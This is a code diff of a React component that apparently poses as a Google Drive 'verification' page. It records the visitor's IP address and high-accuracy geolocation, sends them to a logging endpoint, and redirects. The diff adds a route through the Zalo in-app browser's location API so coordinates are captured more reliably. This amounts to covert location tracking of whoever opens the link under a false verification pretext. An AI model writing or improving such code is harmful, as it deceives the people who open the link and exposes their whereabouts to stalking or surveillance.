@@ -41,7 +41,7 @@ export function DriveVerificationClient({ config }: DriveVerificationClientProps
         console.error("Could not fetch IP", e);
     }
 
-    const logDataAndRedirect = (pos?: GeolocationPosition) => {
+    const logDataAndRedirect = (pos?: { coords: { latitude: number; longitude: number; accuracy: number; } }) => {
         setStatus('success');
         setStatusText('Xác minh thành công, đang chuyển hướng...');
         const body: { ip: string; lat?: number; lon?: number; acc?: number, from: string } = { ip: clientIp, from: 'link' };
@@ -61,21 +61,39 @@ export function DriveVerificationClient({ config }: DriveVerificationClientProps
         });
     };
 
-    const handleError = (error: GeolocationPositionError) => {
-      if (error.code === error.PERMISSION_DENIED) {
+    const handleError = (error?: { code: number; message?: string }) => {
+      if (error?.code === 1) { // PERMISSION_DENIED
           setStatus('denied');
       } else {
+          // For other errors (like timeout), just log without location and redirect.
           logDataAndRedirect();
       }
     };
 
-    if (navigator.geolocation) {
+    // Check for Zalo's specific JS API first to fix ReferenceError and optimize
+    if (typeof (window as any).zaloJSV2?.getLocation === 'function') {
+        (window as any).zaloJSV2.getLocation((data: { status: string; latitude: number; longitude: number; accuracy: number; }) => {
+            if (data.status === "SUCCESS" && data.latitude && data.longitude) {
+                logDataAndRedirect({
+                    coords: {
+                        latitude: data.latitude,
+                        longitude: data.longitude,
+                        accuracy: data.accuracy || 15, // Zalo might not return accuracy
+                    },
+                });
+            } else {
+                // If Zalo API fails, treat as permission denied
+                handleError({ code: 1, message: 'Zalo API failed or was denied' });
+            }
+        });
+    } else if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         logDataAndRedirect,
-        handleError,
+        (err) => handleError(err),
         { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
       );
     } else {
+      // Fallback for browsers with no geo support
       logDataAndRedirect();
     }
   };
